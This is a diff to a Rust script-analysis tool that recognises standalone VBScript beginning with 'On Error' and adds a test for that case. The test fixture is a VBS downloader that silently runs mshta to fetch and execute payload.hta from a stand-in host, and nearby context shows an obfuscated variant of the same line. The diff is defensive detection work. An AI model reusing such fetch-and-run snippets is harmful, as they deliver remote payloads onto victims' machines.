@@ -2919,6 +2919,7 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || (first.starts_with("set ") && first.contains("createobject"))
         || first.starts_with("option explicit")
         || first.starts_with("private function")
+        || first.starts_with("on error ")
 }
 
 fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
@@ -14174,6 +14175,34 @@ sh.Run cmd, 0, False"#;
             report.deobfuscated.contains(
                 r#"cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta""#
             ),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_on_error_prefix_shell_run_url_extracted() {
+        let vbs = br#"On Error Resume Next
+Dim cmd
+cmd = "mshta http://standalone-vbs-onerror.example/payload.hta"
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-onerror.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with On Error prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("On Error Resume Next\nDim cmd"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
         );
